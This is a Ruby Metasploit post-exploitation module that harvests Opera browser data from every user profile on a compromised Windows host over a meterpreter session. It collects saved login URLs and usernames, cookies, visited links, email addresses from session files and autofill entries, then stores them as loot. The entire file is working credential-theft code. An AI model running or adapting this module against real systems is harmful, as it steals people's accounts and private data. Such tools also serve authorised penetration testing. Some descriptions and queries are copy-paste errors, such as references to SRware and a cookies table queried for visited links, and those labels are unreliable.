##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  # this associative array defines the artifacts known to PackRat
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat
  ARTIFACTS =
    {
      application: 'opera',
      app_category: 'browsers',
      gatherable_artifacts: [
        {
          filetypes: 'logins',
          path: 'AppData',
          dir: 'Opera Software',
          artifact_file_name: 'Login Data',
          description: "Opera's sent and received emails",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports SRware's Login data",
              sql_table: 'logins',
              sql_column: 'action_url, username_value'
            }
          ]
        },
        {
          filetypes: 'cookies',
          path: 'AppData',
          dir: 'Opera Software',
          artifact_file_name: 'Cookies',
          description: "Opera's Cookies",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports SRware's Login data",
              sql_table: 'cookies',
              sql_column: 'host_key, name, path'
            }
          ]
        },
        {
          filetypes: 'web_history',
          path: 'AppData',
          dir: 'Opera Software',
          artifact_file_name: 'Visited Links',
          description: "Opera's Visited Links",
          credential_type: 'database',
          sql_search: [
            {
              sql_description: 'Database Commands which exports ',
              sql_table: 'cookies',
              sql_column: 'host_key, name, path'
            }
          ]
        },
        {
          filetypes: 'Email',
          path: 'AppData',
          dir: 'Opera Software',
          artifact_file_name: 'Session*',
          description: 'Emails stored in session file',
          credential_type: 'text',
          regex_search: [
            {
              extraction_description: 'searches for Email TO/FROM address',
              extraction_type: 'Email addresses',
              regex: [
                '(?i-mx:email=.*)',
              ]
            }
          ]
        },
        {
          filetypes: 'personal infomration',
          path: 'AppData',
          dir: 'Opera Software',
          artifact_file_name: 'Web Data',
          description: 'Auto filles sotred in the database',
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: 'Database Commands which exports stored auto-fill data',
              sql_table: 'autofill',
              sql_column: 'name, value'
            }
          ]
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Opera credential gatherer',
        'Description' => %q{
          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
          Further details can be found in the module documentation.
          This is a module that searches for Opera credentials on a windows remote host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep Completed'
  end
end
